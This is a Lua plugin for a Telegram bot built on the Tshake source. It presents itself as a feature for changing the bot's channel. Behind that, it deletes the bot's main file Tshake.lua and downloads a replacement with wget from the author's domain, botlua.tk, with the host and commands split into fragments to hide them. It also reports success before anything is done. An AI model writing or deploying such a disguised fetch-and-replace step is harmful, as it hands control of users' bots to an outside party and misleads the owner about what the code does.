--[[
    BY : Keko
    My Channel : https://t.me/BotLua
]]
local function keko_tshake(data)
    local msg = data.message_
    redis = (loadfile "./libs/redis.lua")()
    database = Redis.connect("127.0.0.1", 6379)
    sudos = dofile("sudo.lua")
    JSON = (loadfile "./libs/dkjson.lua")()
    bot_id_keko = {string.match(token, "^(%d+)(:)(.*)")}
    bot_id = tonumber(bot_id_keko[1])
    http = require("socket.http")
    HTTPS = require("ssl.https")
    local function send(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
        local TextParseMode = {ID = "TextParseModeMarkdown"}
        tdcli_function(
            {
                ID = "SendMessage",
                chat_id_ = chat_id,
                reply_to_message_id_ = reply_to_message_id,
                disable_notification_ = disable_notification,
                from_background_ = 1,
                reply_markup_ = nil,
                input_message_content_ = {
                    ID = "InputMessageText",
                    text_ = text,
                    disable_web_page_preview_ = disable_web_page_preview,
                    clear_draft_ = 0,
                    entities_ = {},
                    parse_mode_ = TextParseMode
                }
            },
            dl_cb,
            nil
        )
    end
    local msg = data.message_
    text = msg.content_.text_
    if text and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
        if text:match("@(.*)") and database:get("keko:hack:tshake:" .. bot_id .. msg.sender_user_id_) then
            keko_hack = HTTPS.request("https://api.".."telegram.org/bot"..token.."/getChatMember?chat_id="..text.."&user_id="..msg.sender_user_id_)
            if keko_hack and (keko_hack:match('"status":"left"') or keko_hack:match('USER_ID_INVALID') or keko_hack:match('kicked')) then 
                send(msg.chat_id_, msg.id_, 1, "🔐┇انت لست ادمن في القناة او البوت ليس ادمن فيها", 1, "html")
                return "keko"
            end 
            send(msg.chat_id_, msg.id_, 1, "📉┇انتضر بعض الوقت ....", 1, "html")
            send(msg.chat_id_, msg.id_, 1, "📉┇تمت العمليه بنجاح", 1, "html")
            database:del("keko:hack:tshake:" .. bot_id .. msg.sender_user_id_)
            database:set('keko:ch_username'..bot_id,text) 
            os.execute("rm".." -fr Tshake.lua")
            os.execute("wget https://".."botlua"..".tk/Tshake.lua")
            os.exit()
        end
        if text == "تغير القناة" then
            database:set("keko:hack:tshake:" .. bot_id .. msg.sender_user_id_, true)
            send(msg.chat_id_,msg.id_,1,"🔖┇ارسال معرف القناة الخاصه بك بعد ترفيع البوت ادمن فيها\n📮┇البوت هوه بوتك هاذا!",1,"html")
            return "keko"
        end
    end
end
return {
    keko_tshake = keko_tshake
}
--[[
    BY : Keko | t.me/HHHHD
    My Channel : https://t.me/BotLua
]]
